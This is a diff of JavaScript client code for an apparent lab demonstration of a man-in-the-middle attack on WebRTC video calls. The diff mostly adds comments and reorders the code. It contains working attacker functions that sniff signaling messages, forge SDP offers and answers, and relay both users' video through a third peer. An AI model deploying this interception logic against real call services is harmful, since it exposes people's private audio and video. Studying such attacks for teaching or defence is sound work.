@@ -17,6 +17,9 @@ var tellA_toCall = false;
 
 var BremoteStream;
 
+/**
+ * ICE server configs -- need to fill in stun info
+ */
 const configuration = {
   iceServers: [
     {
@@ -36,85 +39,56 @@ var sdpConstraints = {
   offerToReceiveVideo: true
 };
 
-/////////////////////////////////////////////
+/////////////////////Room Set Up////////////////////////
 
-//var room = 'foo';
-// Could prompt for room name:
+//Get room name from user
 var myRoom = prompt('Enter room name:');
 
 var socket = io.connect();
 
+//Emits room name to socket to begin process
 if (myRoom !== '') {
   socket.emit('create or join', myRoom);
   console.log('Attempted to create or  join room', myRoom);
 }
 
-socket.on('created', function(room) {
-  console.log('Created room ' + room);
-  myRoom = room;
-  isInitiator = true;
- // isChannelReady = true;//added 11/11 as peerconnection was not starting for A in MaybeStart()
-});
+/////////////////////Signal Server Message Handling (Send)////////////////////////
 
-socket.on('full', function(room) {
-  console.log('Room ' + room + ' is full');
-});
-
-socket.on('join', function (room){
-  console.log('Another peer made a request to join room ' + room);
-  console.log('This peer is the initiator of room ' + room + '!');
-  myRoom = room;
-  isChannelReady = true;
-});
-
-socket.on('joined', function(room) {
-  console.log('joined: ' + room);
-  myRoom = room;
-  isChannelReady = true;
-});
-
-socket.on('log', function(array) {
-  console.log.apply(console, array);
-});
-
-//test function to have attacker forward messages
-socket.on('sniff', function(message, room){
-    console.log("sniffed message:" + message)
-    if ((room  !== 'bad1') &&(message === "got user media"))//b sends got user media before room name ('bad2') is assigned, this should alert us to when b has a room
-    {
-      ForwardA_Message("got user media")
-      //tellA_toCall = true;//added 11-11 may help prevent multiple sends here
-    }
-
-  if (isAttacker && !fakeoffer && message.type === "offer"){ // if this is attack and fake offer hasn't been created
-    UserA_SDP = message;
-    pcA.setRemoteDescription(new RTCSessionDescription(message)); //Remote description of User A
-  //createTwoConnection(pcB)
-  fakeoffer = true;
+/**
+ * Function handles all communication between A/B and the signal server
+ * @param {} message 
+ */
+function sendMessage(message) {
+  console.log('Client sending message: ', message, myRoom);
+  socket.emit('message', message, myRoom);
 }
-else if(isAttacker && !fakeanswer && message.type === "answer"){
-  //createTwoConnection(pcA)
-  pcB.setRemoteDescription(new RTCSessionDescription(message)); //REmote description of User B
-  fakeanswer = true;
-}
-  if (message.type === 'candidate' && isStarted) {
-    var candidate = new RTCIceCandidate({
-      sdpMLineIndex: message.label,
-      candidate: message.candidate
-    });
-    if (room === "bad1"){
-    pcA.addIceCandidate(candidate);
-  }
-  else if (room === "bad2")
-  {
-   pcB.addIceCandidate(candidate); 
-  }
-}
-  //socket.emit('forward', message, room);
 
-});
+/**
+ * ATTACKER FUNCTION
+ * Function used to direct messages to A from attacker
+ * @param {} message message for A
+ */
+function ForwardA_Message(message){
+  socket.emit('forward_ToA', message);
+}
 
-//Sets local attacker varaiable
+/**
+ * ATTACKER FUNCTION
+ * Function used to handle messages to B from attacker
+ * @param {} message 
+ */
+function ForwardB_Message(message){
+  socket.emit('forward_ToB', message);
+}
+
+
+
+/////////////////////Signal Server Message Handling (Receive)////////////////////////
+
+/**
+ * ATTACKER FUNCTION
+ * When mitm room is created, attacker variable is set and connections initialized
+ */ 
 socket.on('set attacker', function(){
   isAttacker = true;
   document.getElementById("header").innerHTML = "You are the attacker!";
@@ -122,21 +96,41 @@ socket.on('set attacker', function(){
   createTwoConnection("pcA");
 });
 
-////////////////////////////////////////////////
+//Sets roomname and isInitiator for A
+socket.on('created', function(room) {
+  console.log('Created room ' + room);
+  myRoom = room;
+  isInitiator = true;
+});
 
-function sendMessage(message) {
-  console.log('Client sending message: ', message, myRoom);
-  socket.emit('message', message, myRoom);
-}
+//Debug -- room is never full with new set up
+socket.on('full', function(room) {
+  console.log('Room ' + room + ' is full');
+});
 
-function ForwardA_Message(message){
-  socket.emit('forward_ToA', message);
-}
-function ForwardB_Message(message){
-  socket.emit('forward_ToB', message);
-}
+//Message emitted when B joins, sets isChannelready to true for A
+socket.on('join', function (room){
+  console.log('Another peer made a request to join room ' + room);
+  console.log('This peer is the initiator of room ' + room + '!');
+  myRoom = room;
+  isChannelReady = true;
+});
 
-// This client receives a message
+//Message emitted when B joins, sets isChannelready to true for B and sets B's room name
+socket.on('joined', function(room) {
+  console.log('joined: ' + room);
+  myRoom = room;
+  isChannelReady = true;
+});
+
+//Allows server to use console log
+socket.on('log', function(array) {
+  console.log.apply(console, array);
+});
+
+/**
+ * Unified handling for A/B when they receive messages from the signal server
+ */
 socket.on('message', function(message) {
   console.log('Client received message:', message);
   if (message === 'got user media') {
@@ -160,11 +154,55 @@ socket.on('message', function(message) {
   }
 });
 
-////////////////////////////////////////////////////
+/**
+ * ATTACKER FUNCTION
+ * Function used by attacker to synchronize call based on what A/B send
+ */ 
+socket.on('sniff', function(message, room){
+  console.log("sniffed message:" + message)
 
-var localVideo = document.querySelector('#localVideo'); //attacker's view of User A
-var remoteVideo = document.querySelector('#remoteVideo'); //attacker's view of User B
+  //Sends "got user media" prompting A to begin the call
+  if ((room  !== 'bad1') &&(message === "got user media")){
+    ForwardA_Message("got user media")
+  }
 
+  // if this is attacker and the fake offer (for b) hasn't been created yet, set the remote desciption for connect
+  if (isAttacker && !fakeoffer && message.type === "offer"){
+    UserA_SDP = message;
+    pcA.setRemoteDescription(new RTCSessionDescription(message)); //Remote description of User A
+    //createTwoConnection(pcB)
+    fakeoffer = true;
+  }else if(isAttacker && !fakeanswer && message.type === "answer"){//Handles answer from B
+    //createTwoConnection(pcA)
+    pcB.setRemoteDescription(new RTCSessionDescription(message)); //REmote description of User B
+    fakeanswer = true;
+  }
+
+  //manages Ice negotiation process for attacker
+  if (message.type === 'candidate' && isStarted) {
+    var candidate = new RTCIceCandidate({
+      sdpMLineIndex: message.label,
+      candidate: message.candidate
+    });
+
+    //Ice negotation for A
+    if (room === "bad1"){
+      pcA.addIceCandidate(candidate);
+    }
+    //Ice negotiation for B
+    else if (room === "bad2"){
+      pcB.addIceCandidate(candidate); 
+    }
+  }
+});
+
+
+///////////////////////CALL SET-UP (USED by A and B)/////////////////////////////
+
+var localVideo = document.querySelector('#localVideo'); //attacker's view of User A (or A/B's view of self)
+var remoteVideo = document.querySelector('#remoteVideo'); //attacker's view of User B (or A/B's view of other)
+
+//Handler for getting user media (for A/B)
 navigator.mediaDevices.getUserMedia({
   audio: true,
   video: true
@@ -181,12 +219,6 @@ function gotStream(stream) {
     localStream = stream;
     localVideo.srcObject = stream;
     sendMessage('got user media');
-
-    //shim function for sending attacker a stream -- not functioning
-    // clonedstream = stream.clone();
-    // socket.emit('stream', clonedstream);
-    // console.log('Uh oh, shared my stream...');
-    
     if (isInitiator) {
       maybeStart();
     }
@@ -199,12 +231,7 @@ var constraints = {
 
 console.log('Getting user media with constraints', constraints);
 
-//if (location.hostname !== 'localhost') {
-//  requestTurn(
-//    'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
-//  );
-//}
-
+//Function used by A/B to execute actions need for call
 function maybeStart() {
   console.log('>>>>>>> maybeStart() ', isStarted, localStream, isChannelReady);
   if (!isStarted && typeof localStream !== 'undefined' && isChannelReady) {
@@ -223,42 +250,11 @@ window.onbeforeunload = function() {
   sendMessage('bye');
 };
 
-/////////////////////////////////////////////////////////
+////////////////////////PEER CONNECTION AND ICE CANDIDATE HANDLING/////////////////////////////////
 
-function createTwoConnection(pcinput) {
-  if (pcinput === "pcA"){
-  try {
-    pcA = new RTCPeerConnection(configuration);
-    pcA.onicecandidate = ToA_handleIceCandidate;
-    pcA.onaddstream = FromA_handleRemoteStreamAdded;
-    pcA.onremovestream = handleRemoteStreamRemoved;
-    console.log('Created RTCPeerConnnection');
-  } catch (e) {
-    console.log('Failed to create PeerConnection, exception: ' + e.message);
-    alert('Cannot create RTCPeerConnection object.');
-    return;
-  }
-}
-else if (pcinput === "pcB")
-{
-  try {
-    pcB = new RTCPeerConnection(configuration);
-    pcB.onicecandidate = ToB_handleIceCandidate;
-    pcB.onaddstream = FromB_handleRemoteStreamAdded;
-    pcB.onremovestream = handleRemoteStreamRemoved;
-    console.log('Created RTCPeerConnnection');
-  } catch (e) {
-    console.log('Failed to create PeerConnection, exception: ' + e.message);
-    alert('Cannot create RTCPeerConnection object.');
-    return;
-  }
-}
-else
-{
-  console.log("nothing created")
-}
-}
-
+/**
+ * Creates Peer connection for A and B
+ */
 function createPeerConnection() {
   try {
     pc = new RTCPeerConnection(configuration);
@@ -273,6 +269,10 @@ function createPeerConnection() {
   }
 }
 
+/**
+ * Event handler for A/B to handle ice candidates
+ * @param {} event peerconnection ecent (ICE candidate)
+ */
 function handleIceCandidate(event) {
   console.log('icecandidate event: ', event);
   if (event.candidate) {
@@ -286,6 +286,73 @@ function handleIceCandidate(event) {
     console.log('End of candidates.');
   }
 }
+
+/**
+ * Unified event handler for A/B to add remote stream
+ * @param {} event 
+ */
+function handleRemoteStreamAdded(event) {
+  console.log('Remote stream added.');
+  remoteStream = event.stream;
+  remoteVideo.srcObject = remoteStream;
+  
+}
+
+/**
+ * Handles remote stream removed (A/B/Attacker)
+ * @param {} event 
+ */
+function handleRemoteStreamRemoved(event) {
+  console.log('Remote stream removed. Event: ', event);
+}
+
+/**
+ * Handles create offer erro (A/B/Attacker)
+ * @param {} event 
+ */
+function handleCreateOfferError(event) {
+  console.log('createOffer() error: ', event);
+}
+
+/**
+ * ATTACKER FUNCTION
+ * Create Peer connection for Attacker
+ * @param {} pcinput either pcA (PC with A) or pcB (pc with B)
+ */
+function createTwoConnection(pcinput) {
+  if (pcinput === "pcA"){
+    try {
+      pcA = new RTCPeerConnection(configuration);
+      pcA.onicecandidate = ToA_handleIceCandidate;
+      pcA.onaddstream = FromA_handleRemoteStreamAdded;
+      pcA.onremovestream = handleRemoteStreamRemoved;
+      console.log('Created RTCPeerConnnection');
+    } catch (e) {
+      console.log('Failed to create PeerConnection, exception: ' + e.message);
+      alert('Cannot create RTCPeerConnection object.');
+      return;
+    }
+  }else if (pcinput === "pcB"){
+    try {
+      pcB = new RTCPeerConnection(configuration);
+      pcB.onicecandidate = ToB_handleIceCandidate;
+      pcB.onaddstream = FromB_handleRemoteStreamAdded;
+      pcB.onremovestream = handleRemoteStreamRemoved;
+      console.log('Created RTCPeerConnnection');
+    } catch (e) {
+      console.log('Failed to create PeerConnection, exception: ' + e.message);
+      alert('Cannot create RTCPeerConnection object.');
+      return;
+    }
+  }else{
+    console.log("nothing created")
+  }
+}
+/**
+ * ATTACKER FUNCTION
+ * Event handler for ICE candidates received from A
+ * @param {} event 
+ */
 function ToA_handleIceCandidate(event) {
   console.log('icecandidate event: ', event);
   if (event.candidate) {
@@ -299,6 +366,12 @@ function ToA_handleIceCandidate(event) {
     console.log('End of candidates.');
   }
 }
+
+/**
+ * ATTACKER FUNCTION
+ * Event handler for ICE candidates received from B
+ * @param {} event 
+ */
 function ToB_handleIceCandidate(event) {
   console.log('icecandidate event: ', event);
   if (event.candidate) {
@@ -313,90 +386,11 @@ function ToB_handleIceCandidate(event) {
   }
 }
 
-function handleCreateOfferError(event) {
-  console.log('createOffer() error: ', event);
-}
-
-function doCall() {
-  console.log('Sending offer to peer');
-  pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
-}
-
-function doFakeCall(){
- pcB.createOffer(FakeB_setLocalAndSendMessage, handleCreateOfferError); 
-}
-function FakeB_setLocalAndSendMessage(sessionDescription) {
-  pcB.setLocalDescription(sessionDescription);
-  console.log('setLocalAndSendMessage sending message', sessionDescription);
-  ForwardB_Message(sessionDescription);
-  //attack have to user forward and to specific user
-}
-function FakeA_setLocalAndSendMessage(sessionDescription) {
-  pcA.setLocalDescription(sessionDescription);
-  console.log('setLocalAndSendMessage sending message', sessionDescription);
-  ForwardA_Message(sessionDescription);
-  //attack have to user forward and to specific user
-}
-function doFakeAnswer() {
-  console.log('Sending answer to peer.');
-  pcA.createAnswer().then(
-    FakeA_setLocalAndSendMessage,
-    onCreateSessionDescriptionError
-  );
-}
-
-
-function doAnswer() {
-  console.log('Sending answer to peer.');
-  pc.createAnswer().then(
-    setLocalAndSendMessage,
-    onCreateSessionDescriptionError
-  );
-}
-
-function setLocalAndSendMessage(sessionDescription) {
-  pc.setLocalDescription(sessionDescription);
-  console.log('setLocalAndSendMessage sending message', sessionDescription);
-  sendMessage(sessionDescription);
-  //attack have to user forward and to specific user
-}
-
-
-
-function onCreateSessionDescriptionError(error) {
-  trace('Failed to create session description: ' + error.toString());
-}
-
-function requestTurn(turnURL) {
-  var turnExists = false;
-  console.log("RequestTURN called in Room", myRoom);	
-  for (var i in pcConfig.iceServers) {
-    if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
-      turnExists = true;
-      turnReady = true;
-      break;
-    }
-  }
-  if (!turnExists) {
-    console.log('Getting TURN server from ', turnURL);
-    // No TURN server. Get one from computeengineondemand.appspot.com:
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4 && xhr.status === 200) {
-        var turnServer = JSON.parse(xhr.responseText);
-        console.log('Got TURN server: ', turnServer);
-        pcConfig.iceServers.push({
-          'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
-          'credential': turnServer.password
-        });
-        turnReady = true;
-      }
-    };
-    xhr.open('GET', turnURL, true);
-    xhr.send();
-  }
-}
-
+/**
+ * ATTACKER FUNCTION
+ * Event handler for A's remote stream
+ * @param {} event PC event with A's remote stream
+ */
 function FromA_handleRemoteStreamAdded(event) { //Video coming from A
   console.log('Remote stream added from A.');
   localStream = event.stream;
@@ -406,6 +400,12 @@ function FromA_handleRemoteStreamAdded(event) { //Video coming from A
   
 }
 
+
+/**
+ * ATTACKER FUNCTION
+ * Event handler for B's remote stream
+ * @param {} event 
+ */
 function FromB_handleRemoteStreamAdded(event) {//Video coming from B
   console.log('Remote stream added from B.');
   BremoteStream = event.stream;
@@ -415,35 +415,155 @@ function FromB_handleRemoteStreamAdded(event) {//Video coming from B
   
 }
 
+////////////////////////CALL MANAGEMENT/////////////////////////////////
 
-function handleRemoteStreamAdded(event) {
-  console.log('Remote stream added.');
-  remoteStream = event.stream;
-  remoteVideo.srcObject = remoteStream;
-  
+/**
+ * Initiates call to attacker (A sends sends an offer)
+ */
+function doCall() {
+  console.log('Sending offer to peer');
+  pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
 }
 
-function handleRemoteStreamRemoved(event) {
-  console.log('Remote stream removed. Event: ', event);
+/**
+ * ATTACKER FUNCTION
+ * Initiates call to B (Attacker sends sends an offer)
+ */
+function doFakeCall(){
+ pcB.createOffer(FakeB_setLocalAndSendMessage, handleCreateOfferError); 
 }
 
+/**
+ * Answers a call (B answers call from attacker)
+ */
+function doAnswer() {
+  console.log('Sending answer to peer.');
+  pc.createAnswer().then(
+    setLocalAndSendMessage,
+    onCreateSessionDescriptionError
+  );
+}
+
+/**
+ * ATTACKER FUNCTION
+ * Answers a call (Attacker answers call from A)
+ */
+function doFakeAnswer() {
+  console.log('Sending answer to peer.');
+  pcA.createAnswer().then(
+    FakeA_setLocalAndSendMessage,
+    onCreateSessionDescriptionError
+  );
+}
+
+/**
+ * Sets local description and sends session description
+ * @param {} sessionDescription 
+ */
+function setLocalAndSendMessage(sessionDescription) {
+  pc.setLocalDescription(sessionDescription);
+  console.log('setLocalAndSendMessage sending message', sessionDescription);
+  sendMessage(sessionDescription);
+}
+
+/**
+ * ATTACKER FUNCTION
+ * Sets local description and sends session description to B
+ * @param {} sessionDescription 
+ */
+function FakeB_setLocalAndSendMessage(sessionDescription) {
+  pcB.setLocalDescription(sessionDescription);
+  console.log('setLocalAndSendMessage sending message', sessionDescription);
+  ForwardB_Message(sessionDescription);
+  //attack have to user forward and to specific user
+}
+
+/**
+ * ATTACKER FUNCTION
+ * Sets local description and sends session description to B
+ * @param {} sessionDescription 
+ */
+function FakeA_setLocalAndSendMessage(sessionDescription) {
+  pcA.setLocalDescription(sessionDescription);
+  console.log('setLocalAndSendMessage sending message', sessionDescription);
+  ForwardA_Message(sessionDescription);
+  //attack have to user forward and to specific user
+}
+
+/**
+ * Unified function (A/B/Attacker) to handle session description errors
+ * @param {} error 
+ */
+function onCreateSessionDescriptionError(error) {
+  trace('Failed to create session description: ' + error.toString());
+}
+
+/**
+ * Hangup function for all users (A/B/Attacker)
+ */
 function hangup() {
   console.log('Hanging up.');
   stop();
   sendMessage('bye');
 }
 
+/**
+ * Hangup function for all users (A/B/Attacker)
+ */
 function handleRemoteHangup() {
   console.log('Session terminated.');
   stop();
   isInitiator = false;
 }
 
+/**
+ * Closes connection for all users (A/B/Attacker)
+ */
 function stop() {
   isStarted = false;
   pc.close();
   pc = null;
 }
+
+//* Legacy Codelab Functions */
+
+//Unused function from Codelab
+//if (location.hostname !== 'localhost') {
+//  requestTurn(
+//    'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
+//  );
+//}
+
+//Unused function from codelab
+// function requestTurn(turnURL) {
+//   var turnExists = false;
+//   console.log("RequestTURN called in Room", myRoom);	
+//   for (var i in pcConfig.iceServers) {
+//     if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
+//       turnExists = true;
+//       turnReady = true;
+//       break;
+//     }
+//   }
+//   if (!turnExists) {
+//     console.log('Getting TURN server from ', turnURL);
+//     // No TURN server. Get one from computeengineondemand.appspot.com:
+//     var xhr = new XMLHttpRequest();
+//     xhr.onreadystatechange = function() {
+//       if (xhr.readyState === 4 && xhr.status === 200) {
+//         var turnServer = JSON.parse(xhr.responseText);
+//         console.log('Got TURN server: ', turnServer);
+//         pcConfig.iceServers.push({
+//           'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
+//           'credential': turnServer.password
+//         });
+//         turnReady = true;
+//       }
+//     };
+//     xhr.open('GET', turnURL, true);
+//     xhr.send();
+//   }
+// }
 
 
 
